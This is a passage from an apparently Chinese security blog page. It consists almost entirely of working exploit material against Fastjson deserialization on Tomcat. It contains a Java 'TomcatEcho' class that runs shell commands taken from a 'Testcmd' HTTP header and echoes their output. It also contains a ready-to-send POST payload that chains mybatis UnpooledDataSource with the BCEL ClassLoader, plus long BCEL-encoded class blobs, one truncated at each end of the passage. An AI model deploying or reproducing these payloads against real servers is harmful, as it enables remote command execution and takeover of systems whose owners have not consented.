$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o$89$d0T$84$8b$b1r$a3$f4$91$e8$r$ea$8b$B$d7$E$dc$3d$e1$i$3c$dd$e1$80$d7w$S$be$b8$3b$c0$c7$e2$9e$87$m$c4$e2$5e$b6$e6$e0o$f4$9e$84$Yw7$Q$dd$d9$9d$40I$dc$3d$O$89$Il$dbp$8a$ed$89$b3tG$7d$O$b3$Ce$k$5bQ$98$u$e5$f5$k$5b$a2$d1$be$cd$e2P$b3$t$Q$b0m$G$w$3d$93$e6$c8D$d8$937Al$ddWS$d2$fe$ff$x9F$99$A$M$faN$ae$b0$9f$e3$98M$U$96$af$b5$u$a3$b5$83$f2$b6$89$b2$b4$99h$9dt$bf$9d8o$82$85$z8$80$$$dcG$rx$98h$e3$94$fe$e3T$80$d3$94$d5$a7$89$f3$F$f4$d2$_0$H$ee$e7a$f2x$d5$f3$d8$c8$e3$96$L$d8$c0c$H$8f$5b$R$cfW$ad$8e$caA$l$TN9$f0$A$dcv9Vr$b6$d7$U$96$f8$m$aa$c3$N9TugQ$da$ec$a1$C$cd$e9$c9$5ez$ae$f11H$tP$jo$YG$cd$e9FO$O$c1F$S$98$7b$944$96$a2$92$be$e4$ab$f3A$y$87D$eb$O$3a$dd$K$9e$y$95b$X$dd$dfF$f7$afF$Nn$t$ac$dc$81EPP$8b$E$c2$Y$m$feA$db$f1$Kx$$$80$e7$b1$8b$9c$ed$e1q$9b_$wpY$m$e1$3c$d8$dc$s$9dJ$A$d7$cd$ee$96$J$cc$cba$7e$e0$9a$J$y8$83$85$f4$d7$e5$5e3$bf$e1$d4$R$d7$f5$N$f3$97$f7$84$cf$ba$96$90$fb$8b$9a$3dAO$60q$O$d7$kvU$d1$ee$V$b4$hs$95$84$D$b5$q$d6$ec$Nz$l$c5$921$ee$a5$a07$b0$94$I$81el$J$d9WY$I$cd$be$y$f7$y$5d$d5$db$s$g$9a$7d$ee$V$7c$V$l$f4$jG$p$87$p$dc$a9$a0$af$8a$3f$8e$b0$L$cdBP$ID$f2$gY$fd$a3n$aa$3f$d5$3e$e8$a5$8dH$85o$f6$3b$X$d7$e5q$d3$U$b3o$3dyX7$c5$D$cb$c7q$3d$83$c8$Z41$9f$cfb$uH$89$be$e10$94$a0$9fI$be$d2$91tZ$a3$3c$e8$f7$5c$ee$88$K$9cc$7d$c0$e0$e5$b0$ae$f0N$g$89$7b$f2$96$fc$de$Z$96$e2d$c3$W$f1$b4$5c$cd$b3$hgz6$96$f7$ec$de$ff$c1$b3$c0$ca$J$ac$ca$a19$d0$c2$w$80$m$f5$7c$TY$5b$cd$5c$5cC$zO$dedQ$9d$a7$aee$d4u$O$b5Y$M$faO$60$7d$fc$E6$c4$83$e28Zsh$cba$e38$da$D$j9l$caas$O$9d$T$b8$89$e2$m$d7Jl$d7$c6P5w$M$VA$ff$E$b6$e4$d0$e50$Q$c5$97$85$ff$m$cfe$_$ae$9e$3c$b8$b8$ec$85$t$b2$f0la$8d$d9$D$99pYG$f0$earm$a5$a7$83$e9$p$I$d1$w$d0$c9O$cdZ$82$f9$84$f1E$84$ecZ$ccB$3d5$edZ$94S$dbV$90t$r$c9W$93$86$d9$84$ec$wh$84$f8$M$e6$e2$m$e6$e1$k$92$ba$9f$d0$7f$M$L$f0$M$W$e2$3c$Wq$d5X$ccu$e2Zn$L$96p$fb$b0$94$bb$h$cb$b8$a3$Iq$e7Q$e7$aa$40$bd$ab$92$90U$8b$88k9$9a$5c$x$b0$dc$b5$Ks$5d$eb$b0$c2$d5$86$h$5d$j$uqua$jy$b9$c6$b5$8d$feU$ed$b5$bb$ae$fc$o$aa9$k$L$b9K4$t$7c$f6$8e$c7$ed$3c$ee$a0$v$A$da$ca$d4d$b3x$f4s$X$f0$a4$3d$Yv$bc$84C$dby$uuR$c5$L$f0$bd$I$ef$r$g$3fn$5b$Q$f87$bc$ad$q$c3$e6y$82$d4$bb$a0$fe$H$d8$3e$ebc$Z$Q$A$A&quot;&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"EXP-Tomcat\"><a href=\"#EXP-Tomcat\" class=\"headerlink\" title=\"EXP(Tomcat)\"></a>EXP(Tomcat)</h2><figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> payload;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Created by IntelliJ IDEA.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@Author</span>: Garckz</span></span><br><span class=\"line\"><span class=\"comment\"> * Date: 2023/5/8</span></span><br><span class=\"line\"><span class=\"comment\"> * Time: &#123;TIME&#125;</span></span><br><span class=\"line\"><span class=\"comment\"> * To change this template use File | Settings | File Templates.</span></span><br><span class=\"line\"><span class=\"comment\"> **/</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.List;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Scanner;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">TomcatEcho</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">TomcatEcho</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//通过反射调用Class.forName()方法获取外部类的实例，并传入对应的请求体数据。</span></span><br><span class=\"line\">    <span class=\"comment\">//如果当前执行环境中存在org.apache.tomcat.util.buf.ByteChunk类，则创建该类的实例并通过setBytes()方法将byte数组拷贝至该实例并构造一个ByteBuffer对象；如果不存在则直接通过ByteBuffer的wrap()方法构造该对象。</span></span><br><span class=\"line\">    <span class=\"comment\">//在输出流中调用反射获取到的外部类方法doWrite()，并将实例化后的字节数据对象作为该方法的参数，从而完成对byte数组写入输出流的操作。</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">writeBody</span><span class=\"params\">(Object var0, <span class=\"type\">byte</span>[] var1)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        Object var2;</span><br><span class=\"line\">        Class var3;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;org.apache.tomcat.util.buf.ByteChunk&quot;</span>);</span><br><span class=\"line\">            var2 = var3.newInstance();</span><br><span class=\"line\">            var3.getDeclaredMethod(<span class=\"string\">&quot;setBytes&quot;</span>, <span class=\"type\">byte</span>[].class, Integer.TYPE, Integer.TYPE).invoke(var2, var1, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;<span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">0</span>), <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(var1.length)&#125;);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class=\"line\">            var2 = var3.getDeclaredMethod(<span class=\"string\">&quot;wrap&quot;</span>, <span class=\"type\">byte</span>[].class).invoke(var3, var1);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (NoSuchMethodException var6) &#123;</span><br><span class=\"line\">            var3 = Class.forName(<span class=\"string\">&quot;java.nio.ByteBuffer&quot;</span>);</span><br><span class=\"line\">            var2 = var3.getDeclaredMethod(<span class=\"string\">&quot;wrap&quot;</span>, <span class=\"type\">byte</span>[].class).invoke(var3, var1);</span><br><span class=\"line\">            var0.getClass().getMethod(<span class=\"string\">&quot;doWrite&quot;</span>, var3).invoke(var0, var2);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Object <span class=\"title function_\">getFV</span><span class=\"params\">(Object var0, String var1)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">Field</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        <span class=\"type\">Class</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var0.getClass();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">while</span>(var3 != Object.class) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                var2 = var3.getDeclaredField(var1);</span><br><span class=\"line\">                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (NoSuchFieldException var5) &#123;</span><br><span class=\"line\">                var3 = var3.getSuperclass();</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">if</span> (var2 == <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NoSuchFieldException</span>(var1);</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            var2.setAccessible(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> var2.get(var0);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//</span></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">boolean</span> <span class=\"variable\">var0</span> <span class=\"operator\">=</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            Thread[] var1 = (Thread[])((Thread[])getFV(Thread.currentThread().getThreadGroup(), <span class=\"string\">&quot;threads&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">var2</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; var2 &lt; var1.length; ++var2) &#123;</span><br><span class=\"line\">                <span class=\"type\">Thread</span> <span class=\"variable\">var3</span> <span class=\"operator\">=</span> var1[var2];</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (var3 != <span class=\"literal\">null</span>) &#123;</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">var4</span> <span class=\"operator\">=</span> var3.getName();</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (!var4.contains(<span class=\"string\">&quot;exec&quot;</span>) &amp;&amp; var4.contains(<span class=\"string\">&quot;http&quot;</span>)) &#123;</span><br><span class=\"line\">                        <span class=\"type\">Object</span> <span class=\"variable\">var5</span> <span class=\"operator\">=</span> getFV(var3, <span class=\"string\">&quot;target&quot;</span>);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (var5 <span class=\"keyword\">instanceof</span> Runnable) &#123;</span><br><span class=\"line\">                            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                                var5 = getFV(getFV(getFV(var5, <span class=\"string\">&quot;this$0&quot;</span>), <span class=\"string\">&quot;handler&quot;</span>), <span class=\"string\">&quot;global&quot;</span>);</span><br><span class=\"line\">                            &#125; <span class=\"keyword\">catch</span> (Exception var11) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">continue</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"type\">List</span> <span class=\"variable\">var6</span> <span class=\"operator\">=</span> (List)getFV(var5, <span class=\"string\">&quot;processors&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">for</span>(<span class=\"type\">int</span> <span class=\"variable\">var7</span> <span class=\"operator\">=</span> <span class=\"number\">0</span>; var7 &lt; var6.size(); ++var7) &#123;</span><br><span class=\"line\">                                <span class=\"type\">Object</span> <span class=\"variable\">var8</span> <span class=\"operator\">=</span> var6.get(var7);</span><br><span class=\"line\">                                var5 = getFV(var8, <span class=\"string\">&quot;req&quot;</span>);</span><br><span class=\"line\">                                <span class=\"type\">Object</span> <span class=\"variable\">var9</span> <span class=\"operator\">=</span> var5.getClass().getMethod(<span class=\"string\">&quot;getResponse&quot;</span>).invoke(var5);</span><br><span class=\"line\">                                var4 = (String)var5.getClass().getMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class).invoke(var5, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testecho&quot;</span>));</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var4 != <span class=\"literal\">null</span> &amp;&amp; !var4.isEmpty()) &#123;</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">200</span>));</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;addHeader&quot;</span>, String.class, String.class).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testecho&quot;</span>), var4);</span><br><span class=\"line\">                                    var0 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                var4 = (String)var5.getClass().getMethod(<span class=\"string\">&quot;getHeader&quot;</span>, String.class).invoke(var5, <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(<span class=\"string\">&quot;Testcmd&quot;</span>));</span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var4 != <span class=\"literal\">null</span> &amp;&amp; !var4.isEmpty()) &#123;</span><br><span class=\"line\">                                    var9.getClass().getMethod(<span class=\"string\">&quot;setStatus&quot;</span>, Integer.TYPE).invoke(var9, <span class=\"keyword\">new</span> <span class=\"title class_\">Integer</span>(<span class=\"number\">200</span>));</span><br><span class=\"line\">                                    String[] var10 = System.getProperty(<span class=\"string\">&quot;os.name&quot;</span>).toLowerCase().contains(<span class=\"string\">&quot;window&quot;</span>) ? <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;cmd.exe&quot;</span>, <span class=\"string\">&quot;/c&quot;</span>, var4&#125; : <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>[]&#123;<span class=\"string\">&quot;/bin/sh&quot;</span>, <span class=\"string\">&quot;-c&quot;</span>, var4&#125;;</span><br><span class=\"line\">                                    writeBody(var9, (<span class=\"keyword\">new</span> <span class=\"title class_\">Scanner</span>((<span class=\"keyword\">new</span> <span class=\"title class_\">ProcessBuilder</span>(var10)).start().getInputStream())).useDelimiter(<span class=\"string\">&quot;\\\\A&quot;</span>).next().getBytes());</span><br><span class=\"line\">                                    var0 = <span class=\"literal\">true</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"keyword\">if</span> ((var4 == <span class=\"literal\">null</span> || var4.isEmpty()) &amp;&amp; var0) &#123;</span><br><span class=\"line\">                                    writeBody(var9, System.getProperties().toString().getBytes());</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                                <span class=\"keyword\">if</span> (var0) &#123;</span><br><span class=\"line\">                                    <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                                &#125;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                            <span class=\"keyword\">if</span> (var0) &#123;</span><br><span class=\"line\">                                <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                            &#125;</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception var12) &#123;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h2 id=\"MyEXP-Tomcat\"><a href=\"#MyEXP-Tomcat\" class=\"headerlink\" title=\"MyEXP(Tomcat)\"></a>MyEXP(Tomcat)</h2><h2 id=\"abitis-回显EXP\"><a href=\"#abitis-回显EXP\" class=\"headerlink\" title=\"abitis 回显EXP\"></a>abitis 回显EXP</h2><figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">    &lt;groupId&gt;org.mybatis&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;mybatis&lt;/artifactId&gt;</span><br><span class=\"line\">  &lt;version&gt;<span class=\"number\">3.5</span><span class=\"number\">.2</span>&lt;/version&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n\n\n<figure class=\"highlight json\"><table><tr><td class=\"code\"><pre><span class=\"line\">POST</span><br><span class=\"line\"></span><br><span class=\"line\">Testcmd<span class=\"punctuation\">:</span>whoami</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.alibaba.fastjson.JSONObject&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;name&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.lang.Class&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;c&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;org.apache.ibatis.datasource.unpooled.UnpooledDataSource&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;key&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;java.lang.Class&quot;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;val&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driverClassLoader&quot;</span><span class=\"punctuation\">:</span><span class=\"punctuation\">&#123;</span><span class=\"attr\">&quot;@type&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span><span class=\"punctuation\">&#125;</span><span class=\"punctuation\">,</span><span class=\"attr\">&quot;driver&quot;</span><span class=\"punctuation\">:</span><span class=\"string\">&quot;&#123;$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$a5Wyx$Ug$Z$ff$cd$5e3$3b$99$90dCB$W$uG$N$b09v$b7$a1$95B$c2$99$90$40J$S$u$hK$97P$db$c9$ec$q$3bd3$Tfg$J$a0$b6$k$d4$D$8fZ$8f$daPO$b4$ae$b7P$eb$s$U9$eaA$b1Z$8fzT$ad$d6zk$f1$f6$8f$da$f6$B$7c$bf$99$N$d9$84$ad$3c$3e$sy$be$f9$be$f7$7b$ef$f7$f7$be3y$fc$e2$p$a7$A$dc$80$7f$89$Q1$m$60P$84$PI$b6h$Cv$f3$Y$e2$91$f2$a3$E$c3$8c$a4$f30x$8c$88t$de$p$c2D$9a$JY$C2$ecr$_$8fQ$B$fb$E$ec$e7q$80$R$5e$c3$e3$b5$ec$f9$3a$R$d5$b8S$c4$5dx$3d$5b$de$m$e2$8dx$T$5b$O$K$b8$5bD7$de$cc$e3$z$ec$fcV$Bo$T$d1$84C$C$de$$$e0$j$3c$de$v$e0$5d$C$ee$R$f0n$k$f7$Kx$P$8f$f7$96$a0$B$efc$cb$fb$F$dc$t$e0$D$C$ee$e71$s$e00$T$bc$93$z$P$I$f8$a0$80$P$J$f8$b0$80$8f$88$f8$u$3e$c6$a8G$E$7c$5c$c0$t$E$3c$u$e0$93$C$b2$3c$3e$c5$e3$d3$o6$e03l$f9$ac$88$cf$e1$f3$o$d6$e3$L$C$be$c8$9eG$d9r$8c$89$3e$c4$7c$fc$S$d3$f4$b0$88$_$p$c7c$9c$83o$b5$a6k$d6Z$O$eeP$dd$z$i$3cmFB$e5P$d6$a5$e9jOf$b8_5$7b$e5$fe$UQ$fc$a3$a6f$a9$adFb$3f$879$a1$ae$dd$f2$5e9$9a$92$f5$c1$e8$d6$fe$dd$aab$b5$f4$b52$f1$d2$98$r$xC$dd$f2$88$zE$89$a4$U$da$b9$k$e2$m$b6$efS$d4$RK3$f44$H$ef$a0ju$90$c0$ca$o$aa$K$u1$cb$d4$f4$c1$96$ba$x$99xLPY8$I$ab$95$94$j$B$8f$e3$94$40$ca$_$r$97$c7$pd$_fdLE$ed$d0$98$fbe$bd$c6$b0$o$5b$edJ$d2$880$5d$Sz$b0$95C$ada$OF$e4$RYI$aa$R$cb$e6$88d$y$z$V$e9$cf$MDZ$f7$5bj$5b2$a3$PI8$81$afH8$89Sd$$$adZ$ec$82B$u$9b$f2$a9$z$r$a7$89$e2$eak$95p$gg$q$3c$8a$afr$u$9f$e94$87$8a$vR$a7n$a9$83$aa$c9$i$f9$g$8f$afK$f8$G$ceJx$M$e78$f0$Jc$H$cb$b6$84o2$3d$8bf$Y$ea1$ac$O$p$a3$t$$$e7$93C$rc$89$e8$9aa$7b$dd$9a$Z$YPM$w$e6$a8$v$8fpX8$r$dfc$c42J$b2$5b$b5$92$c6$94$b8$84$c7$f1$z$O$Lf$b2uhj$aa$90$eb$db8$c7$bc$7d$82R$_$e1$3b$f8$ae$84$ef$e1$fb$94v$JO$e2$H$S$7e$88$l$91$ebV$d2T$e5DZ$c2N$f4$91_$7d$F$95$eb$b5$afZ$q$fc$YO$91s$ea$3eU$91$f0$T$fc$94$f6I$cb$oG$7d$96l$S$$8$E$a6$84$b6gt$ddA$a0$cfJj$e9$da$eb$c8FR$d6$T$v$W$a0o0e$f4$cb$a9$7c$fc$8e$40AV$c4$R$d3P$d4t$da0$a98$b3l$WV$ddh$97$96$b6$q$fc$MO$b3$I$7eN$d07$d5$3d$iJ$c8$f4v5$3dB$f8dx$a7$d3fr$97$99$v$9f$JH$c2A$af$9a$b6TB$93$84_$e0$Zb$t$5c$Q$f6$ad$MY$f2$cb$89$c4$a4$u$cf$f8$94$e1$E$ed$8ctD$97$87$a9$v$7e$v$e1Y$fcJ$c2$afY$g$7c$a3$9a$9e0F$e9$9e$b8$o$94$T$82QT$a1c$b4_$d3$a3$e9$q$j$c3$ca$qpl$efc$8a$ac$ebLw$cd$94$5b$db$9c$40$5b3Z$w$e1$60$ea7$S$7e$8b$df$f1$f8$bd$84$3f$e0$8f$8c$f2$tR$b5k$83$84$e7p$5e$c2$9f$f1$94$84$bf$e0$af$S$b6$p$s$e1o$f8$3b$8f$7fH$f8$tsi$9eb$MG$H$e4$b4$b5$3bm$e8$d1$bd$99Tt$aay$a8$f9$a7$ac$9a$ea$40$8a$60$j$b5$812$zMN$a9g$d4$3f$df$cc$U$db$80a$f6P$w8$y$J$fd$f7f$b7$f1N$S$r$ba$3a$da$a9$a7$zYWHjv$a8$c8$40$m$U$f5$c6$b7$b5S$aa$8a$c8WP57$aaJJ6$d5$84$83$7e$O$eb$8b$d8$ee$bbB$b6$d0$d2d$bc$8e$Gf1$d4$c9$a6$5e$cd$cb$b1Py5$7d$af1D$3e$af$w63$af$q$V$NL$m$ef$f3$p$a62T$y$3d$M$ac$93$W$cb$LB$cd$X$s$7c$95$yO$ab$p$a9$x$r$V$b1$cc$88j$w$8e$d1$aab$f2l$da$T$e87$u$Mx$9a$dd$a1$9e$d0NFv$db$3d$bc$b4H$c0E$a3$xU2$a6$a9$ea$d6$qf$a6W7$3f4$a8$7fI$abs$d8d$g$Z$9a$W$c1$o$7c$f6$VC$Y1$3b$I$9b$ae$ed2$E$F$c5$d0$zYc$af$a2y$85$8e$b6$re3$a6$ee$c9$a8$E$b4$96$ba$9d$USZ$3b$a0$dao$c7N$96$88$ce$a2$n$f0Z$ba$7dx$c4$dao$f3$ed$9c$3e0$f6$d3$9c$Yv$a6$Lu$v$r$95$b1$z$bdJE$$$fbYb$Z$5d$c6$a8j$b6$c9l$uU$87$8a$f4$TK$b9$97Z$c3$b4$98$83$85Z$f2S$a1e$da$7b$tOt$S$da$a9$8fdhnQ$ea$86$d9k$3d$_$ac$Z$d1$82$L$S$af$J$V$bd$60$96$a5LZ$dd$a8$a6$b4az_$d1LZ$f6$f2$81$V$O$_$d6$3b$ba$ba$cfr$b0$9d$7f$a1zBu$7d$ad$O$fa$f2$99$d2$Y$b9$sT$a8$60$ea$86t$cc$$F$t$9d$96$e1$98$c6b$fa$e2$R$c1$7e$3c$e0$d8$x$9f$d6mt$ba$86$9e$i$3d$bd$f5$e3$e0$8e$d1$86$c3$cd$b4$fa$i$o